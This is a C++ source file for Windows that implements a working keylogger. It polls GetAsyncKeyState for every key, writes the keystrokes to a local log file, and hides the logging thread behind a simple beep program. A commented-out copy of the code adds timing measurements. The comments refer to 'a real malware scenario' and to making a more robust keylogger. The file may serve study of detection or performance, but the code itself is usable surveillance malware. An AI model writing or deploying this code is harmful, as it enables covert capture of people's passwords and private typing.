#include <iostream>
#include <string>
#include <Windows.h>
#include <fstream> // Required for file operations
#include <thread>  // Required for threading
#include <vector>  // Required for virtual key code storage

// Function to convert virtual key codes to characters (simple example)
// For a more robust keylogger, you would handle shift states, caps lock,
// and different keyboard layouts using ToAscii or MapVirtualKeyEx.
char VKCodeToChar(int vkCode) {
	if (vkCode >= 'A' && vkCode <= 'Z') {
		return static_cast<char>(vkCode); // Basic handling for letters
	}
	else if (vkCode >= '0' && vkCode <= '9') {
		return static_cast<char>(vkCode); // Basic handling for numbers
	}
	else {
		switch (vkCode) {
		case VK_SPACE: return ' ';
		case VK_RETURN: return '\n';
		case VK_BACK: return '\b'; // Backspace
		case VK_TAB: return '\t';
		case 0x54: return 't';
		case VK_OEM_PERIOD: return '.';
		case VK_OEM_COMMA: return ',';
		case VK_OEM_2: return '/';
		case VK_OEM_1: return ';';
		case VK_OEM_PLUS: return '=';
		case VK_OEM_MINUS: return '-';
		case VK_OEM_4: return '[';
		case VK_OEM_6: return ']';
		case VK_OEM_5: return '\\';
		case VK_OEM_7: return '\'';
			// Add more special characters as needed
		default: return 0; // Unknown key
		}
	}
}

// Global flag to control the keyboard logging thread
bool g_running = true;

// Function for the keyboard logging thread
void KeyboardLoggerThread() {
	std::ofstream outputFile("keyboard_log.txt", std::ios_base::app); // Open in append mode
	if (!outputFile.is_open()) {
		std::cerr << "Error: Could not open keyboard_log.txt for writing.\n";
		return;
	}

	// Keep track of previously pressed keys to detect new presses
	std::vector<bool> keyPressed(256, false); // All possible virtual key codes

	std::cout << "[*] Keyboard logger started.\n";

	while (g_running) {
		for (int i = 1; i < 256; ++i) { // Iterate through all possible virtual key codes
			if (GetAsyncKeyState(i) & 0x8000) { // Check if the most significant bit is set (key is down)
				if (!keyPressed[i]) { // Check if the key was not pressed in the previous iteration
					char keyChar = VKCodeToChar(i);
					if (keyChar != 0) {
						outputFile << keyChar;
						outputFile.flush(); // Flush to file immediately
					}
					keyPressed[i] = true; // Mark as pressed
				}
			}
			else {
				keyPressed[i] = false; // Mark as not pressed
			}
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Poll every 10 milliseconds
	}

	outputFile.close();
	std::cout << "[*] Keyboard logger stopped.\n";
}

int main()
{
	// Start the keyboard logging thread
	std::thread keyLogger(KeyboardLoggerThread);

	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);
	}

	// This part will only be reached if the main loop exits (e.g., via Ctrl+C)
	// In a real malware scenario, you might have different exit conditions.
	g_running = false; // Signal the keyboard logger thread to stop
	keyLogger.join();  // Wait for the keyboard logger thread to finish

	return 0;
}



/*
#include <iostream>
#include <string>
#include <Windows.h>
#include <fstream> // Required for file operations
#include <thread>  // Required for threading
#include <vector>  // Required for virtual key code storage

// Function to convert virtual key codes to characters (simple example)
// For a more robust keylogger, you would handle shift states, caps lock,
// and different keyboard layouts using ToAscii or MapVirtualKeyEx.
char VKCodeToChar(int vkCode) {
	if (vkCode >= 'A' && vkCode <= 'Z') {
		return static_cast<char>(vkCode); // Basic handling for letters
	}
	else if (vkCode >= '0' && vkCode <= '9') {
		return static_cast<char>(vkCode); // Basic handling for numbers
	}
	else {
		switch (vkCode) {
		case VK_SPACE: return ' ';
		case VK_RETURN: return '\n';
		case VK_BACK: return '\b'; // Backspace
		case VK_TAB: return '\t';
		case 0x54: return 't';
		case VK_OEM_PERIOD: return '.';
		case VK_OEM_COMMA: return ',';
		case VK_OEM_2: return '/';
		case VK_OEM_1: return ';';
		case VK_OEM_PLUS: return '=';
		case VK_OEM_MINUS: return '-';
		case VK_OEM_4: return '[';
		case VK_OEM_6: return ']';
		case VK_OEM_5: return '\\';
		case VK_OEM_7: return '\'';
			// Add more special characters as needed
		default: return 0; // Unknown key
		}
	}
}

// Global flag to control the keyboard logging thread
bool g_running = true;

// Function for the keyboard logging thread
void KeyboardLoggerThread() {
	std::ofstream outputFile("keyboard_log.txt", std::ios_base::app); // Open in append mode
	if (!outputFile.is_open()) {
		std::cerr << "Error: Could not open keyboard_log.txt for writing.\n";
		return;
	}

	// Track previously pressed keys
	std::vector<bool> keyPressed(256, false);

	std::cout << "[*] Keyboard logger started.\n";

	while (g_running) {
		for (int i = 1; i < 256; ++i) {

			// ✅ Measure overhead of GetAsyncKeyState
			auto start = std::chrono::high_resolution_clock::now();
			SHORT state = GetAsyncKeyState(i);
			auto end = std::chrono::high_resolution_clock::now();
			std::chrono::duration<double, std::micro> overhead = end - start;

			if (state & 0x8000) {
				if (!keyPressed[i]) {
					char keyChar = VKCodeToChar(i);
					if (keyChar != 0) {
						outputFile << keyChar;
						outputFile.flush(); // Flush to file immediately

						std::cout << "[Key: " << keyChar << "] Overhead: "
							<< overhead.count() << " microseconds\n";
					}
					keyPressed[i] = true;
				}
			}
			else {
				keyPressed[i] = false;
			}
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(10));
	}

	outputFile.close();
	std::cout << "[*] Keyboard logger stopped.\n";
}


int main()
{
	// Start the keyboard logging thread
	std::thread keyLogger(KeyboardLoggerThread);

	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);
	}

	// This part will only be reached if the main loop exits (e.g., via Ctrl+C)
	// In a real malware scenario, you might have different exit conditions.
	g_running = false; // Signal the keyboard logger thread to stop
	keyLogger.join();  // Wait for the keyboard logger thread to finish

	return 0;
}
*/
